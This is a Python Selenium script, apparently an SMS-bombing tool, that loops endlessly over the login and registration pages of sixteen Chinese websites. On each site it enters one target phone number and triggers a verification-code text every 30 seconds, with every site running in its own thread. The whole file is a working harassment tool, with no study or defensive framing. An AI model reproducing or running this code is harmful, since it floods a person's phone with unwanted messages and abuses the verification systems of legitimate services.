from selenium import webdriver
import time
from threading import Thread


class MessageBoom:
    def __init__(self):
        self.phone = "********"
        self.num = 0
        self.phantomjs = "E:\Python 3.6.2\phantomjs-2.1.1\phantomjs.exe"

    def send_yzm(self, name):
        # button.click()
        self.num += 1
        print("{} 第{}次 发送成功{}".format(self.phone, self.num, name))

    def Dankewang(self, name):
        while True:
        # driver = webdriver.Chrome()
            driver = webdriver.PhantomJS(executable_path=self.phantomjs)
            driver.get("https://www.dankegongyu.com/user-center/login.html")
            time.sleep(1)
            tel = driver.find_element_by_xpath("/html/body/div[3]/div/div/div/div/div[1]/div[1]/input")
            tel.send_keys(self.phone)
            time.sleep(1)
            driver.find_element_by_xpath("/html/body/div[3]/div/div/div/div/div[1]/div[2]/input[1]").click()
            time.sleep(1)
            driver.find_element_by_xpath("/html/body/div[3]/div/div/div/div/div[1]/div[2]/input[2]").click()
            # driver.save_screenshot('./111.png')
            self.send_yzm(name)
            time.sleep(1)
            driver.quit()
            time.sleep(30)

    def Yihaodian(self, name):
        while True:
            driver = webdriver.PhantomJS(executable_path=self.phantomjs)
            # driver = webdriver.Chrome()
            driver.get("https://passport.yhd.com/passport/register_input.do")
            time.sleep(1)
            driver.find_element_by_xpath("//input[@id='userName']").send_keys("wujunya625")
            time.sleep(1)
            tel = driver.find_element_by_xpath("//input[@id='phone']")
            tel.send_keys(self.phone)
            time.sleep(1)
            driver.find_element_by_xpath('//*[@id="validPhoneCode"]').click()
            time.sleep(1)
            driver.find_element_by_xpath('//*[@id="validPhoneCodeDiv"]/a').click()
            # driver.save_screenshot('./111.png')
            self.send_yzm(name)

            driver.quit()
            time.sleep(30)

    def Suning(self, name):
        while True:
            driver = webdriver.PhantomJS(executable_path=self.phantomjs)
            # driver = webdriver.Chrome()
            driver.get("https://reg.suning.com/person.do?myTargetUrl=http%3A%2F%2Fwww.suning.com")
            time.sleep(1)
            tel = driver.find_element_by_xpath("//*[@id='mobileAlias']")
            tel.send_keys(self.phone)
            time.sleep(1)
            driver.find_element_by_xpath("//a[@id='sendSmsCode']").click()
            self.send_yzm(name)
            time.sleep(1)
            driver.quit()
            time.sleep(30)

    def Suning2(self, name):
        while True:
        # driver = webdriver.Chrome()
            driver = webdriver.PhantomJS(executable_path=self.phantomjs)
            driver.get("https://passport.suning.com/ids/login")
            time.sleep(1)
            driver.find_element_by_xpath('/html/body/div[2]/div/div/div[1]/a[2]').click()
            time.sleep(1)
            driver.find_element_by_xpath('/html/body/div[2]/div/div/div[2]/div[1]/div[6]/a[1]').click()
            time.sleep(1)
            tel = driver.find_element_by_xpath("//*[@id='phoneNumber']")
            tel.send_keys(self.phone)
            time.sleep(1)
            driver.find_element_by_xpath('/html/body/div[2]/div/div/div[2]/div[2]/div[5]/a').click()
            time.sleep(1)
            self.send_yzm(name)
            driver.quit()
            time.sleep(30)

    def Guazi(self, name):
        while True:
            # driver = webdriver.Chrome()
            driver = webdriver.PhantomJS(executable_path=self.phantomjs)
            driver.get("https://www.guazi.com/www/bj/buy")
            time.sleep(1)
            driver.find_element_by_xpath('//a[@id="js-login"]').click()
            time.sleep(1)
            tel = driver.find_element_by_xpath('//*[@id="login1"]/form/ul/li[1]/input')
            tel.send_keys(self.phone)
            time.sleep(1)
            driver.find_element_by_xpath('//*[@id="login1"]/form/ul/li[2]/button').click()
            # driver.save_screenshot("111.png")
            self.send_yzm(name)
            driver.quit()
            time.sleep(30)

    def Weipinhui(self, name):
        while True:
            driver = webdriver.PhantomJS(executable_path=self.phantomjs)
            driver.get("https://passport.vip.com/register?src=https%3A%2F%2Fwww.vip.com%2F")
            time.sleep(1)
            tel = driver.find_element_by_xpath('//*[@id="J_mobile_name"]')
            tel.send_keys(self.phone)
            time.sleep(1)
            driver.find_element_by_xpath('//*[@id="J_mobile_code"]').click()
            time.sleep(1)
            driver.find_element_by_xpath('//*[@id="J_mobile_verifycode_btn"]').click()
            self.send_yzm(name)
            driver.quit()
            time.sleep(30)

    def Youku(self, name):
        while True:
            driver = webdriver.Chrome()
            # driver = webdriver.PhantomJS(executable_path=self.phantomjs)
            driver.get("http://www.youku.com")
            time.sleep(1)
            driver.find_element_by_xpath('//*[@id="qheader_login"]/img').click()
            time.sleep(1)
            driver.find_element_by_xpath('//*[@id="YT-showMobileLogin-text"]').click()
            time.sleep(1)
            driver.find_element_by_xpath('//input[@id="YT-mAccount"]').send_keys(self.phone)
            # driver.save_screenshot("./youku.png")
            driver.find_element_by_xpath('//*[@id="YT-getMobileCode"]').click()
            self.send_yzm(name)
            driver.quit()
            time.sleep(30)

    def Youku2(self, name):
        while True:
            driver = webdriver.Chrome()
            # driver = webdriver.PhantomJS(executable_path=self.phantomjs)
            driver.get("http://www.youku.com")
            time.sleep(1)
            driver.find_element_by_xpath('//*[@id="qheader_login"]/img').click()
            time.sleep(1)
            driver.find_element_by_xpath('//*[@id="YT-registeBtn"]').click()
            time.sleep(1)
            driver.find_element_by_xpath('//*[@id="YT-mPassport"]').send_keys(self.phone)
            # driver.save_screenshot("./youku.png")
            driver.find_element_by_xpath('//*[@id="YT-mRegPassword"]').send_keys("asd123..ASD")
            driver.find_element_by_xpath('//*[@id="YT-mRepeatPwd"]').send_keys("asd123..ASD")
            driver.find_element_by_xpath('//*[@id="YT-mGetMobileCode"]').click()
            self.send_yzm(name)
            driver.quit()
            time.sleep(30)

    def Shijijiayuan(self, name):
        while True:
            # driver = webdriver.Chrome()
            driver = webdriver.PhantomJS(executable_path=self.phantomjs)
            driver.get("http://reg.jiayuan.com/signup/fillbasic.php?bd=9528")
            time.sleep(1)
            driver.find_element_by_xpath('//*[@id="phoneNumber"]').send_keys(self.phone)
            driver.find_element_by_xpath('//*[@id="mobile_vali"]').click()
            time.sleep(1)
            driver.find_element_by_xpath('//*[@id="get"]').click()
            time.sleep(1)
            self.send_yzm(name)
            driver.save_screenshot("sjjy.png")
            driver.quit()
            time.sleep(30)

    def Aiqiyi(self, name):
        while True:
            driver = webdriver.Chrome()
            # driver = webdriver.PhantomJS(executable_path=self.phantomjs)
            driver.get('http://www.iqiyi.com/iframe/smslogin?from_url=http%3A%2F%2Fvip.iqiyi.com%2Ffirstsix-new-pc.html')
            time.sleep(1)
            driver.find_element_by_xpath('/html/body/div[1]/div[2]/div[1]/div/div/div/div[2]/input').send_keys(self.phone)
            driver.find_element_by_xpath('/html/body/div[1]/div[2]/div[1]/div/div/a').click()
            time.sleep(1)
            # driver.save_screenshot("aiqiyi.png")
            # 未注册'
            try:
                driver.find_element_by_xpath('/html/body/div[1]/div[2]/div[1]/div/div/div/a').click()
            except:
                print("已注册")
            self.send_yzm(name)
            driver.quit()
            time.sleep(30)

    def Tongcheng58(self, name):
        while True:
            driver = webdriver.PhantomJS(executable_path=self.phantomjs)
            # driver = webdriver.Chrome()
            driver.get("https://passport.58.com/login/?path=http%3A//zj.58.com/searchjob.shtml")
            time.sleep(1)
            driver.find_element_by_xpath('//*[@id="pwdLogin"]/a').click()
            time.sleep(1)
            driver.find_element_by_xpath('//*[@id="loginBoxTitle"]/li[2]/a').click()
            time.sleep(1)
            driver.find_element_by_xpath('//*[@id="loginMobile"]').send_keys(self.phone)
            driver.find_element_by_xpath('//*[@id="loginMobilecodeSendBtn"]').click()
            self.send_yzm(name)
            driver.quit()
            time.sleep(30)

    def Leipin(self, name):
        while True:
            driver = webdriver.PhantomJS(executable_path=self.phantomjs)
            driver.get('https://www.liepin.com/event/landingpage/search_newlogin1/')
            time.sleep(1)
            driver.find_element_by_xpath('//input[@name="user_login"]').send_keys(self.phone)
            driver.find_element_by_xpath('//div[@class="login-form"]/a').click()
            # driver.save_screenshot("lp.png")
            self.send_yzm(name)
            driver.quit()
            time.sleep(30)

    def Aipai(self, name):
        while True:
            driver = webdriver.PhantomJS(executable_path=self.phantomjs)
            # driver = webdriver.Chrome()
            driver.get('http://www.aipai.com/signup.php')
            time.sleep(1)
            driver.find_element_by_xpath('//*[@id="phone"]').send_keys(self.phone)
            time.sleep(1)
            driver.find_element_by_xpath('//*[@id="password_phone"]').send_keys('xxk1234')
            time.sleep(1)
            driver.find_element_by_xpath('//*[@id="password2_phone"]').send_keys('xxk1234')
            time.sleep(1)
            driver.find_element_by_xpath('//*[@id="nick_phone"]').send_keys('sfgh')
            time.sleep(1)
            driver.save_screenshot('./a.png')
            driver.find_element_by_xpath('//*[@id="suf_msg"]/div').click()
            self.send_yzm(name)
            driver.quit()
            time.sleep(30)

    def Qingchuanghui(self, name):
        while True:
            driver = webdriver.PhantomJS(executable_path=self.phantomjs)
            driver.get('http://www.17qcc.com/register.html')
            time.sleep(1)
            driver.find_element_by_xpath('//*[@id="phone"]').send_keys(self.phone)
            driver.find_element_by_xpath('//*[@id="getcode"]').click()
            # driver.save_screenshot('./qc.png')
            self.send_yzm(name)
            driver.quit()
            time.sleep(30)

    def Fangtianxia(self, name):
        while True:
            driver = webdriver.PhantomJS(executable_path=self.phantomjs)
            driver.get('https://passport.fang.com/register.aspx?service=renthouse&host=zu.fang.com&backurl=http%3a%2f%2fzu.fang.com%2fdefault.aspx')
            time.sleep(1)
            driver.find_element_by_xpath('//*[@id="strMobile"]').send_keys(self.phone)
            driver.find_element_by_xpath('//*[@id="vcode"]').click()
            # driver.save_screenshot('f.png')
            self.send_yzm(name)
            driver.quit()
            time.sleep(30)

    def Jjbisai(self, name):
        while True:
            driver = webdriver.PhantomJS(executable_path=self.phantomjs)
            driver.get('https://www.jj.cn/reg/reg.html?type=phone')
            time.sleep(1)
            driver.find_element_by_xpath("//input[@id='phone_number']").send_keys(self.phone)
            driver.find_element_by_xpath('//*[@id="phone_pwd"]').send_keys('123456789.')
            driver.find_element_by_xpath('//*[@id="phone_re_pwd"]').send_keys('123456789.')
            driver.find_element_by_xpath('//*[@id="phone_real_name"]').send_keys('**冬')
            driver.find_element_by_xpath('//*[@id="phone_id_card"]').send_keys('35030119**********')
            driver.find_element_by_xpath('//*[@id="sms_code"]').click()
            time.sleep(1)

            driver.find_element_by_xpath('//*[@id="pre_sms_check"]').click()
            driver.save_screenshot('./jj.png')
            self.send_yzm(name)
            driver.quit()
            time.sleep(30)



if __name__ == '__main__':
    hongzha = MessageBoom()
    Jjbisai = Thread(target=hongzha.Jjbisai, args=("jj比赛",))
    Fangtianxia = Thread ( target=hongzha.Fangtianxia, args=("房天下",) )
    Qingchuanghui = Thread(target=hongzha.Qingchuanghui, args=("青创会",))
    Aipai = Thread(target=hongzha.Aipai, args=("爱拍",))
    Leipin = Thread( target=hongzha.Leipin, args=("猎聘",) )
    Tongcheng58 = Thread( target=hongzha.Tongcheng58, args=("58同城",) )
    Shijijiayuan = Thread(target=hongzha.Shijijiayuan, args=("世纪佳缘",))
    Aiqiyi = Thread(target=hongzha.Aiqiyi, args=("爱奇艺",))
    Youku = Thread(target=hongzha.Youku, args=("优酷",))
    Weipinhui = Thread(target=hongzha.Weipinhui, args=("唯品会",))
    Suning = Thread(target=hongzha.Suning, args=("苏宁",))
    Dankewang = Thread(target=hongzha.Dankewang, args=("蛋壳网",))
    Yihaodian = Thread(target=hongzha.Yihaodian, args=("一号店",))
    Suning2 = Thread(target=hongzha.Suning2, args=("苏宁2",))
    Guazi = Thread(target=hongzha.Guazi, args=("瓜子网",))
    Youku2 = Thread(target=hongzha.Youku2, args=("优酷2",))

    Jjbisai.start()
    Fangtianxia.start()
    Qingchuanghui.start()
    Aipai.start()
    Leipin.start()
    Tongcheng58.start()
    Shijijiayuan.start()
    Aiqiyi.start()
    Youku.start()
    Weipinhui.start()
    Suning.start()
    Dankewang.start()
    Yihaodian.start()
    Suning2.start()
    Guazi.start()
    Youku2.start()